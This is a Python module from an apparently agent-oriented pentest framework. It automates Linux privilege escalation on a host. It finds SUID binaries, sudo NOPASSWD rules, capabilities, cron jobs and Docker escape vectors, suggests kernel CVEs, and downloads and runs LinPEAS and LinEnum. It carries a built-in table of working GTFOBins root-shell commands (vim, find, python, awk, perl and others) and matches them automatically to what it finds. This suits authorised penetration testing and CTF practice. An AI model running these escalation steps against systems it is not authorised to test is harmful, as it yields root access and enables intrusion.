"""
KRYON Linux Privilege Escalation Module
=========================================

Linux privilege escalation enumeration and exploitation tools.
Inspired by LinPEAS, LinEnum, and linux-exploit-suggester.

Primary Users:
- Pentest Agent (Alpha-Red)
- Vuln Hunter (Omega-Strike)
"""

import os
from typing import Any, Optional

from kryon.tools.common import generic_linux_command


def enumerate_linux_privesc(verbose: bool = False) -> dict[str, Any]:
    """
    Comprehensive Linux privilege escalation enumeration.

    Args:
        verbose: Include detailed output

    Returns:
        Dictionary with enumeration results

    Example:
        >>> results = enumerate_linux_privesc(verbose=True)
        >>> print(results['suid_binaries'])
    """
    result = {
        "success": False,
        "system_info": {},
        "suid_binaries": [],
        "sudo_permissions": [],
        "writable_files": [],
        "capabilities": [],
        "cron_jobs": [],
        "network_info": {},
        "users": [],
        "groups": [],
        "error": None,
    }

    try:
        # Gather system information
        result["system_info"] = _get_system_info()

        # Find SUID binaries
        suid_result = find_suid_binaries()
        if suid_result.get("success"):
            result["suid_binaries"] = suid_result.get("binaries", [])

        # Check sudo permissions
        sudo_result = check_sudo_permissions()
        if sudo_result.get("success"):
            result["sudo_permissions"] = sudo_result.get("permissions", [])

        # Find writable files
        writable_result = find_writable_files()
        if writable_result.get("success"):
            result["writable_files"] = writable_result.get("files", [])

        # Check capabilities
        cap_result = check_capabilities()
        if cap_result.get("success"):
            result["capabilities"] = cap_result.get("capabilities", [])

        # Find cron jobs
        cron_result = find_cron_jobs()
        if cron_result.get("success"):
            result["cron_jobs"] = cron_result.get("cron_jobs", [])

        # Get network information
        result["network_info"] = _get_network_info()

        # Get users and groups
        result["users"] = _get_users()
        result["groups"] = _get_groups()

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def find_suid_binaries(search_paths: Optional[list[str]] = None, interesting_only: bool = False) -> dict[str, Any]:
    """
    Find SUID/SGID binaries on the system.

    Args:
        search_paths: Paths to search (defaults to common paths)
        interesting_only: Only return potentially exploitable binaries

    Returns:
        Dictionary with SUID/SGID binaries

    Example:
        >>> binaries = find_suid_binaries(interesting_only=True)
    """
    result = {"success": False, "binaries": [], "count": 0, "interesting": [], "error": None}

    try:
        # Common interesting SUID binaries that can lead to privilege escalation
        interesting_binaries = [
            "nmap",
            "vim",
            "vi",
            "find",
            "bash",
            "sh",
            "less",
            "more",
            "nano",
            "cp",
            "mv",
            "awk",
            "man",
            "wget",
            "curl",
            "python",
            "python2",
            "python3",
            "perl",
            "ruby",
            "lua",
            "php",
            "gcc",
            "cc",
            "ld",
            "as",
            "systemctl",
            "journalctl",
            "docker",
            "screen",
            "tmux",
            "script",
            "socat",
            "rlwrap",
            "base64",
            "openssl",
        ]

        # Default search paths
        if not search_paths:
            search_paths = ["/"]

        # Find SUID binaries
        cmd_result = generic_linux_command("find", f"{' '.join(search_paths)} -type f -perm -4000 2>/dev/null")

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            binaries = [line.strip() for line in output.split("\n") if line.strip()]

            result["success"] = True
            result["binaries"] = binaries
            result["count"] = len(binaries)

            # Find interesting binaries
            for binary in binaries:
                binary_name = os.path.basename(binary)
                if binary_name in interesting_binaries:
                    result["interesting"].append(
                        {
                            "path": binary,
                            "name": binary_name,
                            "gtfobins": f"https://gtfobins.github.io/gtfobins/{binary_name}/",
                        }
                    )

            # Return only interesting if requested
            if interesting_only:
                result["binaries"] = [item["path"] for item in result["interesting"]]

        else:
            result["error"] = cmd_result.get("error", "find command failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def find_writable_files(search_paths: Optional[list[str]] = None, exclude_proc: bool = True) -> dict[str, Any]:
    """
    Find world-writable files and directories.

    Args:
        search_paths: Paths to search
        exclude_proc: Exclude /proc and /sys

    Returns:
        Dictionary with writable files

    Example:
        >>> writable = find_writable_files()
    """
    result = {"success": False, "files": [], "directories": [], "count": 0, "error": None}

    try:
        if not search_paths:
            search_paths = ["/etc", "/home", "/var", "/tmp", "/opt"]

        exclude_args = ""
        if exclude_proc:
            exclude_args = "-path /proc -prune -o -path /sys -prune -o"

        # Find world-writable files
        cmd_result = generic_linux_command(
            "find", f"{' '.join(search_paths)} {exclude_args} -type f -perm -002 2>/dev/null"
        )

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            files = [line.strip() for line in output.split("\n") if line.strip()]

            result["files"] = files
            result["count"] = len(files)

        # Find world-writable directories
        dir_result = generic_linux_command(
            "find", f"{' '.join(search_paths)} {exclude_args} -type d -perm -002 2>/dev/null"
        )

        if dir_result.get("success"):
            output = dir_result.get("output", "")
            directories = [line.strip() for line in output.split("\n") if line.strip()]
            result["directories"] = directories

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def check_sudo_permissions() -> dict[str, Any]:
    """
    Check sudo permissions for current user.

    Returns:
        Dictionary with sudo permissions

    Example:
        >>> sudo = check_sudo_permissions()
    """
    result = {
        "success": False,
        "permissions": [],
        "can_sudo_all": False,
        "no_password": [],
        "error": None,
    }

    try:
        # Check sudo -l
        cmd_result = generic_linux_command("sudo", "-l")

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")

            # Check for ALL permissions
            if "(ALL : ALL)" in output or "(ALL) ALL" in output:
                result["can_sudo_all"] = True

            # Check for NOPASSWD
            if "NOPASSWD" in output:
                # Extract commands that don't require password
                for line in output.split("\n"):
                    if "NOPASSWD" in line:
                        result["no_password"].append(line.strip())

            result["permissions"] = output.split("\n")
            result["success"] = True
        else:
            # User might not have sudo permissions
            result["permissions"] = ["No sudo permissions or cannot check"]
            result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def suggest_kernel_exploits(kernel_version: Optional[str] = None) -> dict[str, Any]:
    """
    Suggest kernel exploits based on kernel version.

    Args:
        kernel_version: Kernel version (auto-detected if not provided)

    Returns:
        Dictionary with suggested exploits

    Example:
        >>> exploits = suggest_kernel_exploits()
    """
    result = {"success": False, "kernel_version": "", "exploits": [], "error": None}

    try:
        # Get kernel version if not provided
        if not kernel_version:
            cmd_result = generic_linux_command("uname", "-r")
            if cmd_result.get("success"):
                kernel_version = cmd_result.get("output", "").strip()

        result["kernel_version"] = kernel_version

        # Known kernel exploits database (simplified)
        kernel_exploits = {
            "2.6": [
                {"name": "DirtyCOW", "cve": "CVE-2016-5195", "versions": "2.6.22 - 4.8.3"},
                {"name": "RDS", "cve": "CVE-2010-3904", "versions": "2.6.30 - 2.6.36"},
            ],
            "3.": [
                {"name": "DirtyCOW", "cve": "CVE-2016-5195", "versions": "2.6.22 - 4.8.3"},
                {"name": "Overlayfs", "cve": "CVE-2015-1328", "versions": "3.13.0 - 3.19.0"},
            ],
            "4.": [
                {"name": "DirtyCOW", "cve": "CVE-2016-5195", "versions": "2.6.22 - 4.8.3"},
                {"name": "AF_PACKET", "cve": "CVE-2016-8655", "versions": "4.4.0 - 4.8.12"},
            ],
        }

        # Match kernel version to exploits
        for version_prefix, exploits in kernel_exploits.items():
            if kernel_version.startswith(version_prefix):
                result["exploits"].extend(exploits)

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def check_capabilities() -> dict[str, Any]:
    """
    Check for binaries with capabilities set.

    Returns:
        Dictionary with capabilities

    Example:
        >>> caps = check_capabilities()
    """
    result = {"success": False, "capabilities": [], "interesting": [], "error": None}

    try:
        # Use getcap to find capabilities
        cmd_result = generic_linux_command("getcap", "-r / 2>/dev/null")

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            capabilities = [line.strip() for line in output.split("\n") if line.strip()]

            result["capabilities"] = capabilities

            # Identify interesting capabilities
            interesting_caps = ["cap_setuid", "cap_setgid", "cap_dac_override", "cap_sys_admin"]
            for cap_line in capabilities:
                for interesting in interesting_caps:
                    if interesting in cap_line.lower():
                        result["interesting"].append(cap_line)
                        break

            result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def find_cron_jobs() -> dict[str, Any]:
    """
    Find cron jobs and check for misconfigurations.

    Returns:
        Dictionary with cron jobs

    Example:
        >>> crons = find_cron_jobs()
    """
    result = {"success": False, "cron_jobs": [], "writable_crons": [], "error": None}

    try:
        cron_locations = [
            "/etc/crontab",
            "/etc/cron.d/",
            "/var/spool/cron/",
            "/var/spool/cron/crontabs/",
        ]

        all_crons = []

        for location in cron_locations:
            if os.path.exists(location):
                if os.path.isfile(location):
                    cmd_result = generic_linux_command("cat", location)
                    if cmd_result.get("success"):
                        all_crons.append({"location": location, "content": cmd_result.get("output", "")})
                elif os.path.isdir(location):
                    cmd_result = generic_linux_command("ls", f"-la {location}")
                    if cmd_result.get("success"):
                        all_crons.append({"location": location, "content": cmd_result.get("output", "")})

        result["cron_jobs"] = all_crons

        # Check for writable cron files
        for location in cron_locations:
            if os.path.exists(location):
                cmd_result = generic_linux_command("find", f"{location} -writable 2>/dev/null")
                if cmd_result.get("success"):
                    writable = cmd_result.get("output", "").strip()
                    if writable:
                        result["writable_crons"].append(writable)

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def check_docker_escape() -> dict[str, Any]:
    """
    Check for Docker container escape vectors.

    Returns:
        Dictionary with Docker escape possibilities

    Example:
        >>> docker_check = check_docker_escape()
    """
    result = {
        "success": False,
        "in_container": False,
        "escape_vectors": [],
        "privileged": False,
        "docker_socket": False,
        "error": None,
    }

    try:
        # Check if we're in a container
        if os.path.exists("/.dockerenv"):
            result["in_container"] = True

        # Check for privileged mode
        cmd_result = generic_linux_command("cat", "/proc/self/status")
        if cmd_result.get("success"):
            if "CapEff:	0000003fffffffff" in cmd_result.get("output", ""):
                result["privileged"] = True
                result["escape_vectors"].append(
                    {
                        "method": "Privileged Container",
                        "description": "Container is running in privileged mode",
                    }
                )

        # Check for Docker socket
        if os.path.exists("/var/run/docker.sock"):
            result["docker_socket"] = True
            result["escape_vectors"].append(
                {"method": "Docker Socket", "description": "Docker socket is mounted in container"}
            )

        # Check for sensitive mounts
        cmd_result = generic_linux_command("mount", "")
        if cmd_result.get("success"):
            mounts = cmd_result.get("output", "")
            if "/proc" in mounts or "/sys" in mounts:
                result["escape_vectors"].append(
                    {"method": "Sensitive Mounts", "description": "Sensitive filesystems mounted"}
                )

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


# Helper functions


def _get_system_info() -> dict[str, str]:
    """Get basic system information."""
    info = {}

    commands = {
        "hostname": "hostname",
        "kernel": "uname -r",
        "os": "cat /etc/os-release",
        "arch": "uname -m",
        "user": "whoami",
        "id": "id",
    }

    for key, cmd in commands.items():
        parts = cmd.split()
        result = generic_linux_command(parts[0], " ".join(parts[1:]) if len(parts) > 1 else "")
        if result.get("success"):
            info[key] = result.get("output", "").strip()

    return info


def _get_network_info() -> dict[str, str]:
    """Get network information."""
    info = {}

    commands = {
        "interfaces": "ip a",
        "routes": "ip route",
        "listening": "ss -tuln",
        "connections": "ss -tun",
    }

    for key, cmd in commands.items():
        parts = cmd.split()
        result = generic_linux_command(parts[0], " ".join(parts[1:]))
        if result.get("success"):
            info[key] = result.get("output", "").strip()

    return info


def _get_users() -> list[str]:
    """Get list of users."""
    result = generic_linux_command("cat", "/etc/passwd")
    if result.get("success"):
        users = []
        for line in result.get("output", "").split("\n"):
            if line.strip():
                users.append(line.split(":")[0])
        return users
    return []


def _get_groups() -> list[str]:
    """Get list of groups."""
    result = generic_linux_command("cat", "/etc/group")
    if result.get("success"):
        groups = []
        for line in result.get("output", "").split("\n"):
            if line.strip():
                groups.append(line.split(":")[0])
        return groups
    return []


# ═══════════════════════════════════════════════════════════════
# CTF / TryHackMe Specialized Functions
# ═══════════════════════════════════════════════════════════════


def run_linpeas(output_file: str = "/tmp/linpeas.txt", thorough: bool = False) -> dict[str, Any]:
    """
    Execute LinPEAS (Linux Privilege Escalation Awesome Script).

    LinPEAS is a comprehensive privilege escalation enumeration script that
    highlights potential privilege escalation vectors in red/yellow.

    Args:
        output_file: Where to save LinPEAS output (default: /tmp/linpeas.txt)
        thorough: Run thorough scan (slower but more comprehensive)

    Returns:
        Dictionary with LinPEAS results and findings

    Examples:
        >>> # Basic LinPEAS scan
        >>> results = run_linpeas()
        >>> print(results['summary'])

        >>> # Thorough scan with custom output
        >>> results = run_linpeas(output_file="/tmp/scan.txt", thorough=True)
        >>> print(results['critical_findings'])

        >>> # TryHackMe CTF usage
        >>> results = run_linpeas()
        >>> if results['success']:
        ...     print(f"Found {len(results['critical_findings'])} critical issues")

    Primary Users:
        - CTF Master (Alpha-Crimson)
        - Pentest Agent (Alpha-Red)
        - Vuln Hunter (Alpha-Gold)
    """
    result = {
        "success": False,
        "output_file": output_file,
        "summary": "",
        "critical_findings": [],
        "sudo_findings": [],
        "suid_findings": [],
        "capabilities_findings": [],
        "error": None,
    }

    try:
        # Download LinPEAS if not present
        linpeas_path = "/tmp/linpeas.sh"

        # Try to download LinPEAS from GitHub
        download_cmd = f"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o {linpeas_path} 2>/dev/null || wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O {linpeas_path} 2>/dev/null"

        generic_linux_command("sh", f"-c '{download_cmd}'")

        # Make executable
        generic_linux_command("chmod", f"+x {linpeas_path}")

        # Run LinPEAS
        linpeas_args = f"-a > {output_file}" if thorough else f"> {output_file}"
        generic_linux_command("sh", f"{linpeas_path} {linpeas_args}")

        # Read output file
        read_result = generic_linux_command("cat", output_file)

        if read_result.get("success"):
            output = read_result.get("output", "")
            result["summary"] = output

            # Parse critical findings (simplified - look for key patterns)
            lines = output.split("\n")
            for _i, line in enumerate(lines):
                # Look for sudo permissions
                if "sudo" in line.lower() and ("nopasswd" in line.lower() or "all" in line.lower()):
                    result["sudo_findings"].append(line.strip())

                # Look for SUID binaries
                if "suid" in line.lower() or "-rwsr" in line:
                    result["suid_findings"].append(line.strip())

                # Look for capabilities
                if "cap_" in line.lower():
                    result["capabilities_findings"].append(line.strip())

            # Critical findings are high-priority issues
            result["critical_findings"] = (
                result["sudo_findings"]
                + result["suid_findings"][:5]  # Top 5 SUID findings
                + result["capabilities_findings"]
            )

            result["success"] = True
        else:
            result["error"] = "Failed to read LinPEAS output"

    except Exception as e:
        result["error"] = str(e)

    return result


def run_linenum() -> dict[str, Any]:
    """
    Execute LinEnum (Linux Enumeration Script).

    LinEnum is a comprehensive enumeration script for Linux systems,
    particularly useful for CTF challenges and quick enumeration.

    Returns:
        Dictionary with LinEnum enumeration results

    Examples:
        >>> # Basic LinEnum scan
        >>> results = run_linenum()
        >>> print(results['system_info'])

        >>> # Check for interesting findings
        >>> if results['interesting_files']:
        ...     print("Found interesting files:", results['interesting_files'])

        >>> # TryHackMe CTF usage
        >>> results = run_linenum()
        >>> for finding in results['key_findings']:
        ...     print(f"  - {finding}")

    Primary Users:
        - CTF Master (Alpha-Crimson)
        - Pentest Agent (Alpha-Red)
    """
    result = {
        "success": False,
        "system_info": {},
        "interesting_files": [],
        "key_findings": [],
        "full_output": "",
        "error": None,
    }

    try:
        # Download LinEnum if not present
        linenum_path = "/tmp/LinEnum.sh"

        download_cmd = f"curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o {linenum_path} 2>/dev/null || wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O {linenum_path} 2>/dev/null"

        generic_linux_command("sh", f"-c '{download_cmd}'")
        generic_linux_command("chmod", f"+x {linenum_path}")

        # Run LinEnum
        cmd_result = generic_linux_command("sh", linenum_path)

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            result["full_output"] = output

            # Parse output for key information
            lines = output.split("\n")
            for line in lines:
                # Look for interesting files
                if "password" in line.lower() or "passwd" in line.lower():
                    if line.strip() and not line.startswith("#"):
                        result["interesting_files"].append(line.strip())

                # Look for key findings
                if any(keyword in line.lower() for keyword in ["root", "sudo", "suid", "cron", "capability"]):
                    if line.strip() and len(line.strip()) > 20:  # Avoid noise
                        result["key_findings"].append(line.strip())

            result["success"] = True
        else:
            result["error"] = "LinEnum execution failed"

    except Exception as e:
        result["error"] = str(e)

    return result


def gtfobins_lookup(binary: str, escalation_type: str = "sudo") -> dict[str, Any]:
    """
    Lookup privilege escalation techniques for a binary from GTFOBins.

    GTFOBins is a curated list of Unix binaries that can be used to bypass
    local security restrictions in misconfigured systems.

    Args:
        binary: Binary name (e.g., 'vim', 'find', 'python')
        escalation_type: Type of escalation ('sudo', 'suid', 'capabilities', 'shell')

    Returns:
        Dictionary with GTFOBins techniques

    Examples:
        >>> # Check if vim can be used for sudo privesc
        >>> result = gtfobins_lookup('vim', 'sudo')
        >>> print(result['technique'])

        >>> # Find SUID exploitation for find binary
        >>> result = gtfobins_lookup('find', 'suid')
        >>> if result['found']:
        ...     print(f"Command: {result['command']}")

        >>> # TryHackMe CTF usage - automated privesc
        >>> sudo_bins = check_sudo_permissions()
        >>> for perm in sudo_bins['no_password']:
        ...     binary = perm.split('/')[-1]
        ...     exploit = gtfobins_lookup(binary, 'sudo')
        ...     if exploit['found']:
        ...         print(f"Exploitable: {binary}")

    Primary Users:
        - CTF Master (Alpha-Crimson)
        - Pentest Agent (Alpha-Red)
        - Tactical Analyst (Beta-Gold)
    """
    result = {
        "success": False,
        "binary": binary,
        "found": False,
        "gtfobins_url": f"https://gtfobins.github.io/gtfobins/{binary}/",
        "technique": "",
        "command": "",
        "description": "",
        "error": None,
    }

    try:
        # Database of common GTFOBins exploits (simplified subset)
        gtfobins_db = {
            "vim": {
                "sudo": {
                    "technique": "Vim Shell Escape",
                    "command": "sudo vim -c ':!/bin/sh'",
                    "description": "Execute shell from vim with sudo privileges",
                },
                "suid": {
                    "technique": "Vim SUID Shell",
                    "command": 'vim -c \':py3 import os; os.execl("/bin/sh", "sh", "-p")\'',
                    "description": "Python shell escape maintaining SUID",
                },
            },
            "find": {
                "sudo": {
                    "technique": "Find Exec",
                    "command": "sudo find . -exec /bin/sh \\; -quit",
                    "description": "Execute shell via find -exec",
                },
                "suid": {
                    "technique": "Find SUID Exec",
                    "command": "find . -exec /bin/sh -p \\; -quit",
                    "description": "Execute shell with -p to maintain SUID",
                },
            },
            "python": {
                "sudo": {
                    "technique": "Python Shell",
                    "command": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
                    "description": "Python shell spawn with sudo",
                },
                "suid": {
                    "technique": "Python SUID Shell",
                    "command": 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
                    "description": "Python SUID shell maintaining privileges",
                },
            },
            "python3": {
                "sudo": {
                    "technique": "Python3 Shell",
                    "command": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
                    "description": "Python3 shell spawn with sudo",
                },
                "suid": {
                    "technique": "Python3 SUID Shell",
                    "command": 'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
                    "description": "Python3 SUID shell maintaining privileges",
                },
            },
            "less": {
                "sudo": {
                    "technique": "Less Shell Escape",
                    "command": "sudo less /etc/profile\n!/bin/sh",
                    "description": "Open file with less, then use ! to escape to shell",
                }
            },
            "more": {
                "sudo": {
                    "technique": "More Shell Escape",
                    "command": "sudo more /etc/profile\n!/bin/sh",
                    "description": "Open file with more, then use ! to escape to shell",
                }
            },
            "nano": {
                "sudo": {
                    "technique": "Nano Command Execution",
                    "command": "sudo nano\nCtrl+R Ctrl+X\nreset; sh 1>&0 2>&0",
                    "description": "Nano read file feature to execute commands",
                }
            },
            "awk": {
                "sudo": {
                    "technique": "Awk System Call",
                    "command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
                    "description": "Execute shell via awk system function",
                }
            },
            "perl": {
                "sudo": {
                    "technique": "Perl Exec",
                    "command": "sudo perl -e 'exec \"/bin/sh\";'",
                    "description": "Perl shell execution",
                }
            },
            "ruby": {
                "sudo": {
                    "technique": "Ruby Exec",
                    "command": "sudo ruby -e 'exec \"/bin/sh\"'",
                    "description": "Ruby shell execution",
                }
            },
            "bash": {
                "suid": {
                    "technique": "Bash SUID Shell",
                    "command": "bash -p",
                    "description": "Bash privileged mode maintains SUID",
                }
            },
            "sh": {
                "suid": {
                    "technique": "Sh SUID Shell",
                    "command": "sh -p",
                    "description": "Shell privileged mode maintains SUID",
                }
            },
        }

        # Lookup binary
        binary_lower = binary.lower()
        if binary_lower in gtfobins_db:
            if escalation_type in gtfobins_db[binary_lower]:
                exploit = gtfobins_db[binary_lower][escalation_type]
                result["found"] = True
                result["technique"] = exploit["technique"]
                result["command"] = exploit["command"]
                result["description"] = exploit["description"]
                result["success"] = True
            else:
                result["success"] = True
                result["description"] = (
                    f"Binary found in GTFOBins but no {escalation_type} technique available. Check {result['gtfobins_url']}"
                )
        else:
            result["success"] = True
            result["description"] = f"Binary not in local database. Check GTFOBins: {result['gtfobins_url']}"

    except Exception as e:
        result["error"] = str(e)

    return result


def check_sudo_exploits() -> dict[str, Any]:
    """
    Automated check for sudo misconfiguration exploits.

    Checks current user's sudo permissions and matches against known
    exploitation techniques from GTFOBins.

    Returns:
        Dictionary with exploitable sudo permissions

    Examples:
        >>> # Automated sudo exploit discovery
        >>> exploits = check_sudo_exploits()
        >>> for exploit in exploits['exploitable']:
        ...     print(f"Binary: {exploit['binary']}")
        ...     print(f"Command: {exploit['command']}")

        >>> # TryHackMe CTF automated privesc
        >>> exploits = check_sudo_exploits()
        >>> if exploits['exploitable']:
        ...     first_exploit = exploits['exploitable'][0]
        ...     print(f"Run: {first_exploit['command']}")

    Primary Users:
        - CTF Master (Alpha-Crimson)
        - Pentest Agent (Alpha-Red)
    """
    result = {
        "success": False,
        "sudo_permissions": [],
        "exploitable": [],
        "all_sudo": False,
        "no_password_sudo": [],
        "error": None,
    }

    try:
        # Check sudo permissions
        sudo_check = check_sudo_permissions()

        if sudo_check.get("success"):
            result["sudo_permissions"] = sudo_check.get("permissions", [])
            result["all_sudo"] = sudo_check.get("can_sudo_all", False)
            result["no_password_sudo"] = sudo_check.get("no_password", [])

            # Extract binaries from NOPASSWD entries
            for perm_line in result["no_password_sudo"]:
                # Parse line like: "(ALL) NOPASSWD: /usr/bin/vim"
                if "/" in perm_line:
                    # Extract binary path
                    parts = perm_line.split()
                    for part in parts:
                        if part.startswith("/"):
                            binary_path = part.rstrip(",")
                            binary_name = binary_path.split("/")[-1]

                            # Lookup GTFOBins
                            gtfo_result = gtfobins_lookup(binary_name, "sudo")

                            if gtfo_result.get("found"):
                                result["exploitable"].append(
                                    {
                                        "binary": binary_name,
                                        "path": binary_path,
                                        "technique": gtfo_result.get("technique"),
                                        "command": gtfo_result.get("command"),
                                        "description": gtfo_result.get("description"),
                                    }
                                )

            result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def find_suid_exploitable() -> dict[str, Any]:
    """
    Find and analyze SUID binaries for exploitability.

    Scans for SUID binaries and cross-references with GTFOBins to identify
    exploitable binaries for privilege escalation.

    Returns:
        Dictionary with exploitable SUID binaries

    Examples:
        >>> # Find exploitable SUID binaries
        >>> results = find_suid_exploitable()
        >>> for exploit in results['exploitable']:
        ...     print(f"Binary: {exploit['name']} at {exploit['path']}")
        ...     print(f"Command: {exploit['command']}")

        >>> # TryHackMe CTF SUID privesc
        >>> suids = find_suid_exploitable()
        >>> if suids['exploitable']:
        ...     print(f"Found {len(suids['exploitable'])} exploitable SUID binaries")
        ...     print(f"Try: {suids['exploitable'][0]['command']}")

    Primary Users:
        - CTF Master (Alpha-Crimson)
        - Pentest Agent (Alpha-Red)
        - Vuln Hunter (Alpha-Gold)
    """
    result = {"success": False, "all_suid": [], "exploitable": [], "interesting": [], "error": None}

    try:
        # Find SUID binaries
        suid_result = find_suid_binaries()

        if suid_result.get("success"):
            result["all_suid"] = suid_result.get("binaries", [])
            result["interesting"] = suid_result.get("interesting", [])

            # Check each interesting binary for exploitability
            for suid_item in result["interesting"]:
                binary_name = suid_item.get("name")
                binary_path = suid_item.get("path")

                # Lookup GTFOBins for SUID exploitation
                gtfo_result = gtfobins_lookup(binary_name, "suid")

                if gtfo_result.get("found"):
                    result["exploitable"].append(
                        {
                            "name": binary_name,
                            "path": binary_path,
                            "technique": gtfo_result.get("technique"),
                            "command": gtfo_result.get("command"),
                            "description": gtfo_result.get("description"),
                            "gtfobins_url": gtfo_result.get("gtfobins_url"),
                        }
                    )

            result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result
